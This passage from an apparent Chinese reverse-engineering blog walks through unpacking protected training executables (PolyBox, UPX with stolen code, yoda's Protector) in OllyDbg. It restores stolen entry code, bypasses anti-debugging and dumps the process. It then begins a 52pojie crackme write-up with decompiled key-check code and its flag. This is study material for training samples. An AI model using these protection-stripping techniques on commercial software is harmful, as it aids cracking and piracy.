8908            mov dword ptr ds:[eax],ecx</span><br><span class="line">009F02E9    A1 70214000     mov eax,dword ptr ds:[0x402170]</span><br><span class="line">009F02EE    8B00            mov eax,dword ptr ds:[eax]</span><br><span class="line">009F02F0    A3 38314000     mov dword ptr ds:[0x403138],eax</span><br></pre></td></tr></table></figure><p>遇到下面这种垃圾语句一定要将它改为NOP，否则程序会出错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">009F037C    0F31            rdtsc</span><br></pre></td></tr></table></figure><p>接下来遇到这一语句，注释和信息窗口都显示0040开头，是我们的用户代码段，这里把指令转换，还原我们的真实地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">009F03DA    8B6D 00         mov ebp,dword ptr ss:[ebp]               ; UnPackMe.00401615</span><br></pre></td></tr></table></figure><p>即在被抽取代码段中添加<code>call 00401615</code>。</p><p>运行到这不要retn，F4运行到jmp处，继续F8单步走。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">009F0402    C3              retn</span><br><span class="line">009F0403    EB 04           jmp short 009F0409</span><br></pre></td></tr></table></figure><p>提取最后一句被抽取代码，retn去到伪OEP<code>401504</code>处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">009F0409    90              nop</span><br><span class="line">009F040A    391D 50304000   cmp dword ptr ds:[0x403050],ebx;最后一句被抽取的代码</span><br><span class="line">009F0410    68 04154000     push 0x401504</span><br><span class="line">009F0415    C3              retn</span><br></pre></td></tr></table></figure><p>总结一下被抽取的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp esp</span><br><span class="line">push -1</span><br><span class="line">push 004023D0</span><br><span class="line">push 00401616</span><br><span class="line">009F022E    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br><span class="line">009F0234    50              push eax</span><br><span class="line">009F0235    64:8925 0000000&gt;mov dword ptr fs:[0],esp</span><br><span class="line">009F023C    83EC 68         sub esp,0x68</span><br><span class="line">009F023F    53              push ebx</span><br><span class="line">009F0240    56              push esi                                 ; UnPackMe.00404038</span><br><span class="line">009F0241    57              push edi                                 ; UnPackMe.00407B90</span><br><span class="line">009F0242    8965 E8         mov dword ptr ss:[ebp-0x18],esp</span><br><span class="line">009F0245    33DB            xor ebx,ebx</span><br><span class="line">009F0247    895D FC         mov dword ptr ss:[ebp-0x4],ebx</span><br><span class="line">call 00401615</span><br><span class="line">009F040A    391D 50304000   cmp dword ptr ds:[0x403050],ebx</span><br></pre></td></tr></table></figure><p>去到伪OEP，如果看到全是字节，右键 -&gt; Analysis -&gt; remove analysis from module 。这样就可以看到汇编代码了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00401504   /75 0C           jnz short UnPackMe.00401512</span><br><span class="line">00401506   |68 12164000     push UnPackMe.00401612</span><br><span class="line">0040150B   |FF15 6C214000   call dword ptr ds:[0x40216C]             ; msvcrt.__setusermatherr</span><br><span class="line">00401511   |59              pop ecx                                  ; UnPackMe.00407B90</span><br><span class="line">00401512   \E8 E9000000     call UnPackMe.00401600</span><br></pre></td></tr></table></figure><p>往上拉发现代码被混淆，先不管。拉到retn下面的一句，也就是<code>4014A7</code>处，往下NOP到伪代码处。(后来发现4014A7不够，4014A6也需要NOP掉)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">004014A1    c2 2513         retn 0x1325</span><br><span class="line">004014A4  ^ E3 A5           jecxz short UnPackMe.0040144B</span><br><span class="line">004014A6    cb              retf</span><br><span class="line">004014A7    7B D5           jpo short UnPackMe.0040147E</span><br><span class="line">004014A9    64:03d4         add edx,esp</span><br><span class="line">004014AC    3F              aas</span><br></pre></td></tr></table></figure><p>发现<code>401504</code>也被NOP掉了，选中被NOP掉的前3行右键 -&gt; Undo selection ，还原代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00401504    90              nop</span><br><span class="line">00401505    90              nop</span><br><span class="line">00401506    90              nop</span><br><span class="line">00401507    1216            adc dl,byte ptr ds:[esi]</span><br><span class="line">00401509    40              inc eax</span><br></pre></td></tr></table></figure><p>接下来我们去段首可以选择二进制粘贴的形式，也可以采取逐一汇编的方式进行修改。</p><p>二进制代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">55 8B EC 6A FF 68 D0 23 40 00 68 16 16 40 00 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 68</span><br><span class="line">53 56 57 89 65 E8 33 DB 89 5D FC 6A 02 FF 15 7C 21 40 00 59 83 0D 3C 31 40 00 FF 83 0D 40 31 40</span><br><span class="line">00 FF FF 15 78 21 40 00 8B 0D 30 31 40 00 89 08 FF 15 74 21 40 00 8B 0D 2C 31 40 00 89 08 A1 70</span><br><span class="line">21 40 00 8B 00 A3 38 31 40 00 E8 17 01 00 00 39 1D 50 30 40 00</span><br></pre></td></tr></table></figure><p>选中所有NOP二进制粘贴，新建EIP，运行loadPE和importREC，修正指针，脱壳成功。</p><h2 id="7-13-未知壳"><a href="#7-13-未知壳" class="headerlink" title="7.13  未知壳"></a>7.13  未知壳</h2><h3 id="7-13-1-PolyBox"><a href="#7-13-1-PolyBox" class="headerlink" title="7.13.1 PolyBox"></a>7.13.1 PolyBox</h3><p>这个是个捆绑壳，意思是伪装成其他类别的壳，加大脱壳的难度。</p><p>PEID查壳显示FSG壳，这种壳用了FSG的外衣，把要加壳的程序当成一种资源加密起来。</p><p>用FSG专用的ESP定律找到第2层壳的OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00402F18    55              push ebp</span><br><span class="line">00402F19    8BEC            mov ebp,esp</span><br><span class="line">00402F1B    83C4 F0         add esp,-0x10</span><br><span class="line">00402F1E    B8 C02E4000     mov eax,UnPackMe.00402EC0                ; ASCII &quot;\n&quot;</span><br></pre></td></tr></table></figure><p>在命令窗口输入<code>bp WriteProcessMemory</code>。<code>WriteProcessMemory</code>是读取程序的大小，也可以解释为处理写入的数据。F9运行，程序停在dll领空，查看堆栈窗口，它给程序写入了起始地址为<code>3D0000</code>的程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0012FDE4   0040201B  /CALL 到 WriteProcessMemory 来自 UnPackMe.00402016</span><br><span class="line">0012FDE8   00000048  |hProcess = 00000048 (window)</span><br><span class="line">0012FDEC   00400000  |Address = 0x400000</span><br><span class="line">0012FDF0   003D0000  |Buffer = 003D0000</span><br><span class="line">0012FDF4   00001000  |BytesToWrite = 1000 (4096.)</span><br><span class="line">0012FDF8   0012FF48  \pBytesWritten = 0012FF48</span><br><span class="line">0012FDFC   0012FE08  指向下一个 SEH 记录的指针</span><br></pre></td></tr></table></figure><p>用LoadPE找到进程，右键-&gt;区域转存，找到起始地址为<code>3D0000</code>的区域转存，后缀名改为exe即可运行。</p><h3 id="7-13-2-UPX-Stolen-Code"><a href="#7-13-2-UPX-Stolen-Code" class="headerlink" title="7.13.2 UPX(Stolen Code)"></a>7.13.2 UPX(Stolen Code)</h3><p>单步和ESP定律都不太行，用两次内存镜像到达一串jmp指令的地方。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004014E4  - FF25 1C204000   jmp dword ptr ds:[&lt;&amp;MFC42.#CWinApp::InitApplication_3922&gt;]                ; mfc42.#CWinApp::InitApplication_3922</span><br><span class="line">004014EA  - FF25 20204000   jmp dword ptr ds:[&lt;&amp;MFC42.#CWinApp::AddToRecentFileList_1089&gt;]            ; mfc42.#CWinApp::AddToRecentFileList_1089</span><br></pre></td></tr></table></figure><p>很明显这是由MFC写的程序，拿一个完整的MFC程序做对比。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0040163D     C3                        RETN</span><br><span class="line">0040163E   - FF25 94214000             JMP DWORD PTR DS:[&lt;&amp;msvcrt.__CxxFrameHandler&gt;]  </span><br><span class="line">00401644     CC                        INT3</span><br><span class="line">00401645     CC                        INT3</span><br><span class="line">0040164F     CC                        INT3</span><br><span class="line">00401650   - FF25 90214000             JMP DWORD PTR DS:[&lt;&amp;msvcrt._except_handler3&gt;]   </span><br><span class="line">00401656     55                        PUSH EBP;这里是OEP</span><br><span class="line">00401657     8BEC                      MOV EBP,ESP</span><br><span class="line">00401659     6A FF                     PUSH -1</span><br><span class="line">0040165B     68 E0234000               PUSH 004023E0</span><br><span class="line">00401660     68 50164000               PUSH &lt;JMP.&amp;msvcrt._except_handler3&gt;             </span><br><span class="line">00401665     64:A1 00000000            MOV EAX,DWORD PTR FS:[0]</span><br></pre></td></tr></table></figure><p>被偷代码的程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">004016F5    C3              retn</span><br><span class="line">004016F6  - FF25 A4214000   jmp dword ptr ds:[&lt;&amp;MSVCRT.__CxxFrameHandler&gt;]               ; msvcrt.__CxxFrameHandler</span><br><span class="line">004016FC    CC              int3</span><br><span class="line">004016FD    CC              int3</span><br><span class="line">004016FE    CC              int3</span><br><span class="line">004016FF    CC              int3</span><br><span class="line">00401700    98              cwde</span><br><span class="line">00401701    e5 27           in eax,0x27</span><br><span class="line">00401703    69AB ED2F71B3 0&gt;imul ebp,dword ptr ds:[ebx-0x4C8ED013],0xC6844200</span><br><span class="line">0040170D    084A 64         or byte ptr ds:[edx+0x64],cl</span><br><span class="line">00401710    A1 00000000     mov eax,dword ptr ds:[0]</span><br></pre></td></tr></table></figure><p>OEP前面的代码都是一样的，所以我们要找<code>&lt;&amp;msvcrt._except_handler3&gt;</code>函数的地址。查看与它同模块的<code>&lt;&amp;MSVCRT.__CxxFrameHandler&gt;</code>的地址(双击即可查看)为<code>4021A4</code>，在命令窗口输入<code>d 4021A4</code>回车。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00402194 &gt;77C05C94  msvcrt._except_handler3</span><br><span class="line">00402198 &gt;77C1EE4F  msvcrt._controlfp</span><br><span class="line">0040219C &gt;77C04DF8  msvcrt._onexit</span><br><span class="line">004021A0 &gt;77C04E51  msvcrt.__dllonexit</span><br><span class="line">004021A4 &gt;77BF27FA  msvcrt.__CxxFrameHandler</span><br></pre></td></tr></table></figure><p>很容易找到<code>&lt;&amp;msvcrt._except_handler3&gt;</code>的地址为<code>402194</code>，然后是入口代码，都一样的，只有两个下面的push指令不一样。因为第二个push也刚好是<code>&lt;&amp;msvcrt._except_handler3&gt;</code>函数地址，所以我们只需找第一个push的地址。</p><p>把堆栈窗口的滚动条往下拉到底(因为最先压栈的在最底部)，从下往上看，找到第一个压入的程序函数，就是我们第一个push进去的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0012FFD0   0012FFE0  指向下一个 SEH 记录的指针</span><br><span class="line">0012FFD4   00401886  SE处理程序</span><br><span class="line">0012FFD8   00402500  UnPackMe.00402500;程序函数，所以是这个</span><br><span class="line">0012FFDC   00000000</span><br><span class="line">0012FFE0   0012CFA0  指向下一个 SEH 记录的指针</span><br><span class="line">0012FFE4   7C839AD8  SE处理程序</span><br><span class="line">0012FFE8   7C817080  返回到 kernel32.7C817080;这个是系统函数，不是</span><br><span class="line">0012FFEC   00000000</span><br><span class="line">0012FFF0   00000000</span><br><span class="line">0012FFF4   00000000</span><br><span class="line">0012FFF8   00407000  UnPackMe.&lt;ModuleEntryPoint&gt;;这个是入口点</span><br><span class="line">0012FFFC   00000000</span><br></pre></td></tr></table></figure><p>还有最后一句，正常程序的代码为<code>64:A1 00000000</code>，而加壳程序的代码与上面一句混淆了，所以也要将它修改为<code>64:A1 00000000</code>。</p><p>将代码拼凑起来，由于中间的代码不够用，所以把第1行jmp去掉，因为其它代码都是入口点必须的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jmp 402194;去掉</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">push -1</span><br><span class="line">push 402500</span><br><span class="line">push 402194</span><br><span class="line">mov eax,dword ptr fs:[0]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00401700    55              push ebp;将此处设置为新EIP</span><br><span class="line">00401701    8BEC            mov ebp,esp</span><br><span class="line">00401703    6A FF           push -0x1</span><br><span class="line">00401705    68 00254000     push UnPackMe.00402500</span><br><span class="line">0040170A    68 94214000     push &lt;&amp;MSVCRT._except_handler3&gt;</span><br><span class="line">0040170F    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br></pre></td></tr></table></figure><p>这时用ODdump说“不能创建程序”，用LoadPE也不能抓取进程，是因为这个程序由反调试功能。用任务管理器将程序进程结束，再在OD用ODdump即可。</p><h3 id="7-13-3-yoda’s-Protector-1-03-3"><a href="#7-13-3-yoda’s-Protector-1-03-3" class="headerlink" title="7.13.3 yoda’s Protector 1.03.3"></a>7.13.3 yoda’s Protector 1.03.3</h3><p>PEID说是这个壳，但也不知道是不是。OD载入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040A6ED &gt;  E8 03000000     call UnPackMe.0040A6F5</span><br><span class="line">0040A6F2    EB 01           jmp short UnPackMe.0040A6F5</span><br><span class="line">0040A6F4    E9 BB550000     jmp UnPackMe.0040FCB4</span><br></pre></td></tr></table></figure><p>忽略除非法内存访问的所有异常，在StrongOD中取消勾选“跳过某些异常”。重载，F9运行。程序停在空白代码处。</p><p>方法一：此时堆栈窗口显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0012EBE0   0012EC70  指向下一个 SEH 记录的指针</span><br><span class="line">0012EBE4   0040CA2C  SE处理程序</span><br></pre></td></tr></table></figure><p>在反汇编窗口Ctrl+G，跟随SE句柄。F2下断，Shift+F9运行，取消断点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040CA2C    55              push ebp</span><br><span class="line">0040CA2D    8BEC            mov ebp,esp</span><br><span class="line">0040CA2F    57              push edi</span><br></pre></td></tr></table></figure><p>F8往下，走到此处EDI的值就是OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040CA55    3E:89B8 B800000&gt;mov dword ptr ds:[eax+0xB8],edi          ; UnPackMe.00401700</span><br></pre></td></tr></table></figure><p>Ctrl+G跟随<code>401700</code>到达OEP。脱壳，一定要修正镜像大小。这个程序是有涉及到锁键盘、锁任务栏的，但可以用这种方法巧妙绕过。</p><p>方法二：在<code>M</code>模块<code>.text</code>处下断，Shift+F9也能运行到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040CA2C    55              push ebp</span><br><span class="line">0040CA2D    8BEC            mov ebp,esp</span><br><span class="line">0040CA2F    57              push edi</span><br></pre></td></tr></table></figure><p>往后操作一样。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-程序是什么语言编译的&quot;&gt;&lt;a href=&quot;#1-程序是什么语言编译的&quot; class=&quot;headerlink&quot; title=&quot;1. 程序是什么语言编译的&quot;&gt;&lt;/a&gt;1. 程序是什么语言编译的&lt;/h1&gt;&lt;p&gt;从目前国内接触到程序看，比较流行的编译器有：VC系列、易语言、.NET、Delphi，一些曾经用的很多但渐渐少了有：VB、ASM、BC++，还有一些用的比较少的有：AutoIt、PB、QT等，下面提供一些实例，结合实例来看看“入口点代码”、“程序区段”和“加载模块”等特征。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="脱壳" scheme="http://example.com/tags/%E8%84%B1%E5%A3%B3/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解2022春节——Windows中级题</title>
    <link href="http://example.com/posts/5ada4708.html"/>
    <id>http://example.com/posts/5ada4708.html</id>
    <published>2022-04-05T01:29:28.052Z</published>
    <updated>2022-04-11T05:25:46.594Z</updated>
    
    <content type="html"><![CDATA[<p>拿到程序的第一时间运行一下，熟悉一下程序的流程。这个程序的流程是要我们输入UID和key。用PE工具查一下壳，发现有UPX壳，用ESP定律即可脱壳。验证程序是否脱壳成功，可载入OD看是否能查询到字符串，或载入IDA查看是否有函数或是否可以反编译出伪代码。脱壳后还要保证程序与未脱壳程序执行的流程要一致。</p><span id="more"></span><h1 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  <span class="built_in">SetConsoleTitleA</span>(<span class="string">&quot;【2022春节】解题领红包之三&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_403930</span>((<span class="type">int</span>)dword_41DDD0, <span class="string">&quot;Input your UID: &quot;</span>);</span><br><span class="line">  <span class="built_in">sub_402800</span>(&amp;v27);</span><br><span class="line">  <span class="keyword">if</span> ( v27 &gt; <span class="number">2000000</span> )                          <span class="comment">// v27 == UID,不能大于2000000</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">sub_403930</span>((<span class="type">int</span>)dword_41DDD0, <span class="string">&quot;Invalid UID, please input again.&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_402660</span>(<span class="number">10</span>);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_403930</span>((<span class="type">int</span>)dword_41DDD0, <span class="string">&quot;Input your Key: &quot;</span>);</span><br><span class="line">  <span class="built_in">sub_403BC0</span>(&amp;dword_41DE60, &amp;v29);              <span class="comment">// v29 == key</span></span><br><span class="line">  v8 = <span class="built_in">sub_401100</span>(v27);                         <span class="comment">// v8 = UID % 25</span></span><br><span class="line">  v9 = <span class="built_in">sub_401080</span>(v27);                         <span class="comment">// v9 = map[UID % 12]</span></span><br><span class="line">  v25 = <span class="built_in">sub_401110</span>(v9);                         <span class="comment">// 与v9有关，即与map[UID % 12]有关</span></span><br><span class="line">  v24 = v8;                                     <span class="comment">// v24 = v8 = UID % 25</span></span><br><span class="line">  v28 = &amp;v20;</span><br><span class="line">  <span class="built_in">sub_402460</span>((<span class="type">int</span>)&amp;v20, (<span class="type">int</span>)&amp;v29);             <span class="comment">// v20 = v29 = key</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_401520</span>(v20, v21, v22, v23, v24, v25) == <span class="number">1</span> )<span class="comment">// 与key, UID % 12和UID % 25有关，关键函数</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="built_in">sub_403930</span>((<span class="type">int</span>)dword_41DDD0, <span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_402660</span>(<span class="number">10</span>);</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_401100</span><span class="params">(<span class="type">signed</span> <span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 % <span class="number">25</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_401080</span><span class="params">(<span class="type">signed</span> <span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [sp+0h] [bp-30h]@1</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [sp+4h] [bp-2Ch]@1</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+8h] [bp-28h]@1</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+Ch] [bp-24h]@1</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+10h] [bp-20h]@1</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+14h] [bp-1Ch]@1</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+18h] [bp-18h]@1</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+1Ch] [bp-14h]@1</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [sp+20h] [bp-10h]@1</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [sp+24h] [bp-Ch]@1</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [sp+28h] [bp-8h]@1</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [sp+2Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  v3 = <span class="number">3</span>;</span><br><span class="line">  v4 = <span class="number">5</span>;</span><br><span class="line">  v5 = <span class="number">7</span>;</span><br><span class="line">  v6 = <span class="number">9</span>;</span><br><span class="line">  v7 = <span class="number">11</span>;</span><br><span class="line">  v8 = <span class="number">15</span>;</span><br><span class="line">  v9 = <span class="number">17</span>;</span><br><span class="line">  v10 = <span class="number">19</span>;</span><br><span class="line">  v11 = <span class="number">21</span>;</span><br><span class="line">  v12 = <span class="number">23</span>;</span><br><span class="line">  v13 = <span class="number">25</span>;</span><br><span class="line">  <span class="keyword">return</span> *(&amp;v2 + a1 % <span class="number">12</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> __cdecl <span class="title">sub_401520</span><span class="params">(<span class="type">char</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">signed</span> <span class="type">int</span> a5, <span class="type">int</span> a6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  v19 = v18;</span><br><span class="line">  std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::_Tidy(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sub_4034E0</span>(<span class="string">&quot;flag&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;flag&quot;</span>));   <span class="comment">// flag初始化</span></span><br><span class="line">  v23 = v18;</span><br><span class="line">  std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::_Tidy(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sub_4034E0</span>(&amp;dword_41A0F8, <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;dword_41A0F8));</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">sub_402BE0</span>(&amp;dword_41A0B0, <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;dword_41A0B0));<span class="comment">// flag初始化后：v19[]=flag&#123;Happy_New_Year_52Pojie_2022&#125;</span></span><br><span class="line">  v17 = a5;                                     <span class="comment">// v17 = UID % 25</span></span><br><span class="line">  v16 = a6;                                     <span class="comment">// v16 = map[UID % 12]</span></span><br><span class="line">  v51 = &amp;v12;</span><br><span class="line">  <span class="built_in">sub_402460</span>((<span class="type">int</span>)&amp;v12, (<span class="type">int</span>)&amp;a1);              <span class="comment">// v12 = a1 = key</span></span><br><span class="line">  <span class="built_in">sub_4011B0</span>((<span class="type">int</span>)&amp;v50, v12, v13, v14, v15, v16, v17);<span class="comment">// 这个关键函数的返回值存到v50[],也就是说我们输入的key要经过转换才能变成v19[]</span></span><br><span class="line">  <span class="built_in">LOBYTE</span>(v52) = <span class="number">29</span>;</span><br><span class="line">  v8 = <span class="built_in">sub_403ED0</span>((<span class="type">int</span>)&amp;v50, (<span class="type">int</span>)&amp;v19);        <span class="comment">// v8 == 